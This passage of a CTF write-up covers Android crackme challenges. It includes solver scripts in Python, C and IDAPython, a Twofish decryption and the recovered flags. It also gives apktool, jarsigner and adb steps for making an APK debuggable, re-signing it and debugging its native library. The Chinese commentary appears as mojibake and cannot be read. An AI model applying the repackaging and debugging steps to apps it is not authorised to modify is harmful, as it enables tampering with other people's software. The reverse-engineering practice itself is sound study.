class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'wigwrkaugala'</span></span><br><span class="line">base = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">a = [<span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>,</span><br><span class="line">     <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>,</span><br><span class="line">     <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">16</span>]</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    ans += [a[base.index(i)]]</span><br><span class="line">print(ans)</span><br><span class="line">b = [<span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>,</span><br><span class="line">         <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">25</span>]</span><br><span class="line">base = list(base)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">    flag += base[b[i]]</span><br><span class="line">    b = b[<span class="number">1</span>:len(b)] + [b[<span class="number">0</span>]]</span><br><span class="line">    base = base[<span class="number">1</span>:len(base)] + [base[<span class="number">0</span>]]</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br><span class="line"><span class="comment">#venividivkcr</span></span><br></pre></td></tr></table></figure><h3 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h3><p>è¾“å…¥å­—ç¬¦å’Œå’Œsoå±‚å‡½æ•°è·å¾—çš„å­—ç¬¦ä¸²ç»è¿‡md5åŠ å¯†åè¿›è¡Œæ¯”è¾ƒã€‚</p><p>ä»è¿™ä¸ªé¢˜ç»ƒä¹ äº†ä¸‹è°ƒè¯•soã€‚æ³¨æ„ï¼šå®‰å“æ¨¡æ‹Ÿå™¨ä¸èƒ½è°ƒè¯•armæ¶æ„çš„soæ–‡ä»¶ï¼Œè¿˜æ˜¯æœ€å¥½ç”¨çœŸæœºæ¥è°ƒè¯•nativeå±‚ã€‚</p><p>é¦–å…ˆæ˜¯ç›´æ¥æ¨¡æ‹Ÿç¨‹åºè·‘flagï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">46</span>,  <span class="number">54</span>,  <span class="number">66</span>,  <span class="number">76</span>,  <span class="number">95</span>, <span class="number">191</span>, <span class="number">224</span>,  <span class="number">58</span>, <span class="number">168</span>, <span class="number">195</span>, </span><br><span class="line">   <span class="number">32</span>,  <span class="number">99</span>, <span class="number">137</span>, <span class="number">183</span>, <span class="number">192</span>,  <span class="number">28</span>,  <span class="number">29</span>,  <span class="number">68</span>, <span class="number">194</span>,  <span class="number">40</span>, </span><br><span class="line">  <span class="number">127</span>, <span class="number">237</span>,   <span class="number">2</span>,  <span class="number">14</span>,  <span class="number">93</span>, <span class="number">102</span>, <span class="number">143</span>, <span class="number">152</span>, <span class="number">181</span>, <span class="number">183</span>, </span><br><span class="line">  <span class="number">208</span>,  <span class="number">22</span>,  <span class="number">77</span>, <span class="number">131</span>, <span class="number">248</span>, <span class="number">251</span>,   <span class="number">1</span>,  <span class="number">67</span>,  <span class="number">71</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">"Hello Ph0en1x"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v6 = <span class="built_in">strlen</span>(b);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ( i = <span class="keyword">sizeof</span>(a) - <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> v3 = a[i] + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *v7 = &amp;a[i - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> v4 = i % v6;</span><br><span class="line">a[i] = (b[v4] ^ (v3 - *v7)) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">0</span>] = (a[<span class="number">0</span>] ^ <span class="number">0x48</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(a)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(a[i]+<span class="number">1</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag&#123;Ar3_y0u_go1nG_70_scarborough_Fair&#125;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è°ƒè¯•äº†ã€‚ç®€å•è®°ä¸€ä¸‹æµç¨‹ï¼š</p><p>å‡†å¤‡å·¥ä½œï¼š</p><p>1.è§£åŒ…ç¨‹åºï¼Œ<strong>apktool.bat d a.apk</strong>ã€‚åœ¨AndroidManifest.xmlä¸­çš„<strong>application</strong>åé¢åŠ ä¸Šandroid:debuggable=â€trueâ€ã€‚</p><p>2.é‡æ–°æ‰“åŒ…ç¨‹åºï¼Œ<strong>apktool.bat b a</strong>ï¼Œè¿™æ—¶å€™åœ¨aæ–‡ä»¶å¤¹ä¸­çš„distä¸‹çš„å°±æ˜¯ç›®æ ‡é‡æ–°æ‰“åŒ…åçš„ç¨‹åºã€‚</p><p>3.å¯¹é‡æ‰“åŒ…åçš„apkè¿›è¡Œç­¾åã€‚</p><ul><li>ç”Ÿæˆç­¾åæ–‡ä»¶ï¼škeytool -genkey -alias abc.keystore -keyalg RSA -validity 20000 -keystore abc.keystore</li><li>è¿›è¡Œç­¾åï¼šjarsigner -verbose -keystore abc.keystore -signedjar b.apk a.apk abc.keystore</li></ul><p>æ¥ä¸‹æ¥æŠŠç¨‹åºè£…å…¥æ¨¡æ‹Ÿå™¨ï¼Œè¿è¡Œï¼Œè¿›è¡Œè°ƒè¯•ï¼Œæ“ä½œå’Œå¸¸è§„çš„è°ƒè¯•elfæ–‡ä»¶å·®ä¸å¤šäº†ã€‚</p><p>ä»¥è°ƒè¯•æ¨¡å¼å¯åŠ¨ç¨‹åºï¼š<strong>adb shell am start -D -n åŒ…å/.æ´»åŠ¨å</strong></p><p>ç«¯å£è½¬å‘ï¼š<strong>adb forward tcp:23946 tcp:23946</strong></p><p>å› ä¸ºæˆ‘ç”¨çš„æ¨¡æ‹Ÿå™¨ï¼Œè¿™é‡Œç”¨äº†x86æ¶æ„çš„soæ–‡ä»¶æ‰è°ƒè¯•ä¸Šï¼Œè™½ç„¶æœ‰ç‚¹ä¸èƒ½ç†è§£ï¼Œä¸ºä»€ä¹ˆæ¨¡æ‹Ÿå™¨é‡Œç¨‹åºéƒ½èƒ½è¿è¡Œï¼Œè¯´æ˜å¯¹soæ–‡ä»¶æ˜¯è¿è¡Œäº†çš„å•Šï¼Œé‚£è°ƒè¯•æ€ä¹ˆå°±ä¸è¡Œå‘¢ï¼ˆ<strong>åœ¨ä¹‹åçªç„¶æƒ³åˆ°çš„æƒ³æ³•è¡¥å……ï¼šå¯èƒ½æ˜¯é¢˜ç›®æœ‰å¯¹åº”ç»“æ„çš„soæ–‡ä»¶ï¼Œåªæ˜¯æ²¡æä¾›ç»™æˆ‘ä»¬</strong>ï¼‰ï¼Œä¸”android_serveråœ¨æ¨¡æ‹Ÿå™¨é‡Œä¹Ÿå¯ä»¥è¿è¡Œçš„ã€‚ã€‚å…¶å®è¿™é‡Œçš„æç¤ºå¯ä»¥çœ‹è§å®ƒè°ƒç”¨çš„æ˜¯<strong>1/lib/x86/ä¸‹çš„so</strong>ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210206212259169.png" alt="image-20210206212259169"></p><p>å—¯ï¼Œï¼Œåˆå­¦ä¸€ä¸ªä¸œè¥¿å¼€å§‹æ€»æ˜¯æœ‰å¾ˆå¤šç–‘æƒ‘çš„ï¼Œç­‰æ¥è§¦å¤šäº†æ¥æ…¢æ…¢ç†è§£ã€‚</p><p>idaä¸­æˆåŠŸé™„åŠ ä¸Šç¨‹åºåï¼Œåœ¨Modulesæ¨¡å—æ‰¾åˆ°æˆ‘ä»¬è¦è°ƒè¯•çš„soæ–‡ä»¶ï¼Œå†ç»§ç»­æ‰¾åˆ°æˆ‘ä»¬è¦è°ƒè¯•çš„å‡½æ•°ã€‚</p><p>å¾—åˆ°ç»“æœï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210206210632330.png" alt="image-20210206210632330"></p><h3 id="é»‘å®¢ç²¾ç¥"><a href="#é»‘å®¢ç²¾ç¥" class="headerlink" title="é»‘å®¢ç²¾ç¥"></a>é»‘å®¢ç²¾ç¥</h3><p>å‡ºç°æ–°çŸ¥è¯†ç‚¹ï¼šsoæ–‡ä»¶ä¸­çš„å‡½æ•°ä¸ºåŠ¨æ€æ³¨å†Œã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210207182454660.png" alt="image-20210207182454660"></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210207182859376.png" alt="image-20210207182859376"></p><p>ç„¶åå°±æ˜¯ä¸€ä¸ªåŠ ä¸Šæ–‡ä»¶è¯»å†™æ“ä½œçš„å¼‚æˆ–åŠ å¯†ã€‚</p><p>2ä¸ªæ¶‰åŠçš„å‡½æ•°åŠŸèƒ½ï¼šé€šå¸¸è¿ç”¨æ¥è®¡ç®—å‡ºä¸€ä¸ªæ–‡ä»¶ä¸­æ•°æ®çš„å­—èŠ‚æ•°ã€‚</p><ul><li>C åº“å‡½æ•° <strong>int fseek(FILE *stream, long int offset, int whence)</strong> è®¾ç½®æµ <strong>stream</strong> çš„æ–‡ä»¶ä½ç½®ä¸ºç»™å®šçš„åç§» <strong>offset</strong>ï¼Œå‚æ•° offset æ„å‘³ç€ä»ç»™å®šçš„ <strong>whence</strong> ä½ç½®æŸ¥æ‰¾çš„å­—èŠ‚æ•°ã€‚</li><li>C åº“å‡½æ•° <strong>long int ftell(FILE *stream)</strong> è¿”å›ç»™å®šæµ stream çš„å½“å‰æ–‡ä»¶ä½ç½®ã€‚</li></ul><p>æ¥ä¸‹æ¥è§£é¢˜éƒ¨åˆ†ï¼šç›´æ¥è¾“å…¥å¯†æ–‡å€¼ï¼Œåœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°å¼‚æˆ–åçš„å€¼å³æ˜¯flagã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210207184727271.png" alt="image-20210207184727271"></p><h3 id="easy-dex"><a href="#easy-dex" class="headerlink" title="easy-dex"></a>easy-dex</h3><p>é¢˜ç›®å¾—åˆ°flagçš„éš¾åº¦ä¸å¤§ï¼Œä½†æ¶‰åŠçš„çŸ¥è¯†è¿˜éœ€è¦å¤šå­¦ä¹ ã€‚</p><p>jadxä¸­å‘ç°æ²¡æœ‰dexæ–‡ä»¶ï¼Œä»AndroidMainfest.xmlçœ‹åˆ°ï¼šNativeActivityï¼Œå®‰å“è¿›è¡Œndkå¼€å‘ä½¿ç”¨çš„ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯è½¬æˆ˜soæ–‡ä»¶ä¸­äº†ã€‚<img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/ncjKwbuX1qBF6ke.png" alt="image-20210208171101099"></p><p>æ‰¾åˆ°android_mainå‡½æ•°ï¼Œé¦–å…ˆæ˜¯è¿›è¡Œè§£å¯†äº†2ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰“å°å‡ºæ¥å°±æ˜¯appåŒ…è·¯å¾„ç›¸å…³çš„ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208171841729.png" alt="image-20210208171841729"></p><p>ç„¶åä»æ‰“å°çš„logï¼Œå¯ä»¥å¸®åŠ©è¯†åˆ«ç¨‹åºçš„åŠŸèƒ½å’Œæµç¨‹ã€‚å°±æ˜¯åœ¨10så†…æ‘‡åŠ¨æ‰‹æœº100æ¬¡ï¼Œç„¶åä¼šä½¿ç”¨è¿™ä¹‹é—´çš„è¡¨ç¤ºæ¬¡æ•°çš„æ•°æ®æ¥è§£å¯†ä¸€äº›æ•°æ®ä»£ç ï¼šå°±æ˜¯æŠŠencåˆ†ä¸º10ç»„ï¼Œç„¶åå‰8ç»„åˆ†åˆ«å’Œ9, 19, 29â€¦å¼‚æˆ–è§£å¯†ï¼Œå2ç»„å’Œ89å¼‚æˆ–è§£å¯†ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172040397.png" alt="image-20210208172040397"></p><p>ç„¶åè§£å‹ç¼©æ•°æ®ï¼Œå†™å…¥æ–‡ä»¶ã€‚ä»ä¸Šé¢æ‰“å°å‡ºçš„è·¯å¾„ä¿¡æ¯ï¼Œå¯ä»¥çŒœæµ‹è¿™ä¸ªå°±æ˜¯ç”Ÿæˆä¸€ä¸ªdexæ–‡ä»¶ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172227628.png" alt="image-20210208172227628"></p><p>ä»¿ç…§ç¨‹åºé€»è¾‘ä½¿ç”¨idapythonè§£å¯†æ•°æ®åå†™å…¥æ–‡ä»¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line">addr = <span class="number">0x07004</span></span><br><span class="line">length = <span class="number">0x3CA10</span></span><br><span class="line">n = length//<span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">    a = get_byte(addr+i)</span><br><span class="line">    b = i//n</span><br><span class="line">    b = <span class="number">8</span> <span class="keyword">if</span> b &gt; <span class="number">8</span> <span class="keyword">else</span> b </span><br><span class="line">    c = b*<span class="number">10</span>+<span class="number">9</span></span><br><span class="line">    data += [a^c]</span><br><span class="line">data = bytes(data)</span><br><span class="line">f = open(<span class="string">'ans.Z'</span>, <span class="string">'wb'</span>)</span><br><span class="line">f.write(data)</span><br><span class="line">f.close()</span><br><span class="line">print(<span class="string">"-------success-----------"</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯èŠ±äº†ç‚¹æ—¶é—´çš„çš„uncompressæ“ä½œï¼Œè¯•äº†è¯•linuxä¸‹çš„å‘ç°ä¸è¡Œã€‚ç„¶åæœç´¢æ–‡ä»¶å¤´ï¼š<strong>78 9c</strong>ï¼Œå‘ç°å¯ä»¥ä½¿ç”¨<a href="http://aluigi.org/mytoolz/offzip.zip" target="_blank" rel="noopener">Aluigiâ€™s offzip</a> ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172543745.png" alt="image-20210208172543745"></p><p>æå–å‡ºæ–‡ä»¶å…¶ä¸­çš„æ•°æ®ï¼Œå¾—åˆ°ä¸€ä¸ªdexæ–‡ä»¶ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175926442.png" alt="image-20210208175926442"></p><p>åˆ†ædexæ–‡ä»¶ã€‚å‘ç°æœ‰å¾ˆå¤šidï¼Œåœ¨res\values\public.xmlä¸­æ‰¾åˆ°å¯¹åº”idçš„nameï¼Œç„¶åå†åˆ°stringsä¸­æ‰¾åˆ°å¯¹åº”nameçš„å­—ç¬¦ä¸²ã€‚å¯¹å…¶æ³¨é‡Šäº†ä¸€ä¸‹ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172846985.png" alt="image-20210208172846985"></p><p>çœ‹äº†ä¸€åœˆåï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬è¾“å…¥çš„ç»è¿‡ä¸€ç§åŠ å¯†ç®—æ³•åä¸å¯†æ–‡æ¯”è¾ƒï¼Œè€Œ<strong>I have a male fish and a female fish.</strong>æ˜¯keyï¼Œçœ‹åˆ°åªæ˜¯å–äº†å®ƒçš„32ä½ï¼Œç„¶åæ˜¯keyåˆ¤æ–­ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208173320567.png" alt="image-20210208173320567"></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208173332255.png" alt="image-20210208173332255"></p><p>å¼€å§‹ä»å­—ç¬¦ä¸²fishä»¥ä¸ºæ˜¯blowfishåŠ å¯†ï¼Œä½†ç®€å•çœ‹äº†ä¸‹æµç¨‹ï¼Œå®Œå…¨å¯¹ä¸ä¸Šã€‚</p><blockquote><p><strong>blowfishæ˜¯åŠ å¯†64bitä¸ºæ•°æ®ï¼Œå¯†é’¥ä¹Ÿæ˜¯64bitä½ã€‚æŠŠå¯†æ–‡åˆ†ä¸ºæ¯8ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œç„¶åä¸€ç»„åˆ†æˆ2ä¸ªéƒ¨åˆ†ï¼Œè¿›è¡Œè½®å‡½æ•°åŠ å¯†ã€‚</strong></p></blockquote><p>ä½†è¿™é‡Œæ˜¯æ¯16ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œä¸”åŠ å¯†æµç¨‹ä¹Ÿä¸ä¸€æ ·ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175231246.png" alt="image-20210208175231246"></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175306552.png" alt="image-20210208175306552"></p><p>æœ€åï¼Œç¿»äº†ä¸€ä¸‹è¿™ä¸ªåŠ å¯†ä¸­çš„æ•°æ®ç”¨æ¥æœç´¢ä¸‹æ‰¾æ‰¾ç›¸å…³çš„åŠ å¯†ç®—æ³•ã€‚</p><p>ä»æœ€é¡¶éƒ¨çš„æ•°æ®ï¼Œgoogleç»“æœï¼š<a href="https://xz.aliyun.com/t/5807" target="_blank" rel="noopener">TwoFish</a></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175435115.png" alt="image-20210208175435115"></p><p>ç„¶åä½¿ç”¨pythonè§£å¯†ä¸€ä¸‹ï¼šå› ä¸º33ä½ï¼Œä¸æ˜¯16çš„å€æ•°ï¼Œç”¨0è¡¥é½æˆäº†48ä½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twofish <span class="keyword">import</span> Twofish</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">-120</span>, <span class="number">77</span>, <span class="number">-14</span>, <span class="number">-38</span>, <span class="number">17</span>, <span class="number">5</span>, <span class="number">-42</span>, <span class="number">44</span>, <span class="number">0xE0</span>, <span class="number">109</span>, <span class="number">85</span>, <span class="number">0x1F</span>, <span class="number">24</span>, <span class="number">-91</span>, <span class="number">0x90</span>, <span class="number">-83</span>, <span class="number">0x40</span>, <span class="number">-83</span>, <span class="number">0x80</span>, <span class="number">84</span>, <span class="number">5</span>, <span class="number">-94</span>, <span class="number">-98</span>, <span class="number">-30</span>, <span class="number">18</span>, <span class="number">70</span>, <span class="number">-26</span>, <span class="number">71</span>, <span class="number">5</span>, <span class="number">-99</span>, <span class="number">-62</span>, <span class="number">-58</span>, <span class="number">0x75</span>, <span class="number">29</span>, <span class="number">-44</span>, <span class="number">6</span>, <span class="number">0x70</span>, <span class="number">-4</span>, <span class="number">81</span>, <span class="number">84</span>, <span class="number">9</span>, <span class="number">22</span>, <span class="number">-51</span>, <span class="number">0x5F</span>, <span class="number">-34</span>, <span class="number">12</span>, <span class="number">0x2F</span>, <span class="number">77</span>]</span><br><span class="line">enc = [i&amp;<span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> enc]</span><br><span class="line">enc = bytes(enc)</span><br><span class="line"></span><br><span class="line">key = <span class="string">'I have a male fish and a female '</span>.encode() <span class="comment">#bytesç±»å‹</span></span><br><span class="line"></span><br><span class="line">T = Twofish(key)</span><br><span class="line">flag = <span class="string">b''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)//<span class="number">16</span>):</span><br><span class="line">    flag += T.decrypt(enc[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)])</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#qwb&#123;TH3y_Io&lt;e_EACh_OTh3r_FOrEUER&#125;</span></span><br></pre></td></tr></table></figure><p>æœ€åæ˜¯åšå®Œé¢˜çœ‹äº†åˆ«äººwpå­¦ä¹ ï¼Œå‘ç°ï¼š</p><ul><li>é‚£ä¸ªuncompressæ“ä½œå…¶å®å¯ä»¥ç›´æ¥ä½¿ç”¨pythonçš„zlibæ¨¡å—ï¼Œ<strong>zlib.decompress(data)</strong> å°±å¯ä»¥äº†ã€‚</li><li>å¯ä»¥æŠŠdexåˆæˆæ–°çš„apkæ–‡ä»¶è¿è¡Œï¼Œæ¥ä¸‹æ¥æ“ä½œä¸€ä¸‹ã€‚</li></ul><p>dexåˆæˆæ–°çš„apkæ–‡ä»¶ï¼š</p><p>1.æŠŠä¹‹å‰çš„appè§£åŒ…ã€‚</p><p>2.æŠŠ<strong>AndroidManifest.xml</strong>ä¸­çš„android:hasCode=â€falseâ€å±æ€§å»æ‰ï¼Œé»˜è®¤ä¸ºTrueã€‚åŸå› ï¼šä¹‹å‰çš„appæ˜¯ç”¨c++å¼€å‘çš„ï¼Œappä¸­å¹¶ä¸åŒ…å«javaä»£ç ï¼Œæ‰€ä»¥æŠŠè¿™ä¸ªå±æ€§è®¾ç½®ä¸ºFalseã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208185306706.png" alt="image-20210208185306706"></p><p>3.æŠŠ<strong>AndroidManifest.xml</strong>ä¸­activityçš„android:nameæ”¹ä¸ºå½“å‰åŒ…å’ŒMainActivityã€‚</p><p>4.æŠŠä¹‹å‰å¾—åˆ°çš„dexæ–‡ä»¶æ”¹åä¸ºclasses.dexæ”¾åˆ°è§£åŒ…ç›®å½•ä¸‹ã€‚</p><p>5.é‡æ–°æ‰“åŒ…ï¼Œå¹¶ç­¾åã€‚</p><p>æˆåŠŸï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208190250967.png" alt="image-20210208190250967"></p><h3 id="ä½ æ˜¯è°"><a href="#ä½ æ˜¯è°" class="headerlink" title="ä½ æ˜¯è°"></a>ä½ æ˜¯è°</h3><p>æ‰¾åˆ°è§¦æ‘¸å“åº”çš„åœ°æ–¹ï¼Œå¯ä»¥çœ‹åˆ°<strong>sorted flag</strong>ç›¸å…³å­—ç¬¦ä¸²ï¼Œç„¶åä¸Šé¢çš„getsnaæ–¹æ³•æ˜¯å¾—åˆ°æ±‰å­—å­—ç¬¦çš„unicodeç¼–ç è¿›è¡Œä¸€ä¸ªä»å°åˆ°å¤§çš„é€‰æ‹©æ’åºï¼Œæœ€åæ¯”è¾ƒã€‚</p><p>è¿™é‡Œä»æ’åºç»“æœåçš„æ±‰å­—ç¼–ç ç»“æœå¯ä»¥æ¨å‡ºæœªç»è¿‡æ’åºåçš„å€¼ã€‚</p><p>æœ€åæŒ‰ç…§ä»å­—ç¬¦ä¸²çš„æç¤ºï¼ŒæŠŠæ±‰å­—ç»“æœå†è½¬å›unicodeç¼–ç å†å¥—ä¸Šflag{}å³æ˜¯ã€‚</p><h3 id="åŸºç¡€android"><a href="#åŸºç¡€android" class="headerlink" title="åŸºç¡€android"></a>åŸºç¡€android</h3><p>çœ‹äº†ä¸‹ç¨‹åºé€»è¾‘ï¼Œè§£å‡ºç¬¬ä¸€ä¸ªå¯†ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">107</span>-i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>)]</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›å…¥MainActivity2æŠŠç¬¬äºŒæ¬¡çš„è¾“å…¥ä½œä¸ºå‚æ•°å‘é€äº†ä¸€ä¸ªå¹¿æ’­ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220151141668.png" alt="image-20210220151141668"></p><p>ç»§ç»­è·Ÿåˆ°æ¥å—å¹¿æ’­çš„åœ°æ–¹ï¼Œçœ‹åˆ°åˆå¼€å§‹äº†ä¸€ä¸ªæ–°çš„æ´»åŠ¨ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220151639862.png" alt="image-20210220151639862"></p><p>ä½†çœ‹äº†åé¢çš„NextContentä¹Ÿæ²¡æœ‰éªŒè¯å›¾ç‰‡æ˜¾ç¤ºç çš„åœ°æ–¹ï¼Œä½†æ˜¯è¯»äº†ä¸‹ä»£ç ï¼ŒåŠŸèƒ½å°±æ˜¯å–å‡ºappä¸­çš„èµ„æºæ–‡ä»¶ä¸­çš„timg_2.zipä½œä¸ºå›¾ç‰‡æ›¿æ¢åŸæ¥çš„å›¾ç‰‡ã€‚ç›´æ¥åœ¨jebçš„Assetsæ‰¾åˆ°è¯¥æ–‡ä»¶ï¼Œæ‰“å¼€å³æ˜¯ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220151914447.png" alt="image-20210220151914447"></p><p>å…¶å®ï¼Œæ—¢ç„¶æ˜¯NextContentæ´»åŠ¨ç›´æ¥æ›´æ–°äº†æœ‰flagçš„å›¾ç‰‡ï¼Œç›´æ¥adbå¯åŠ¨æŒ‡å®šçš„æ´»åŠ¨ï¼Œä¹Ÿå¯ä»¥å¾—åˆ°ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n 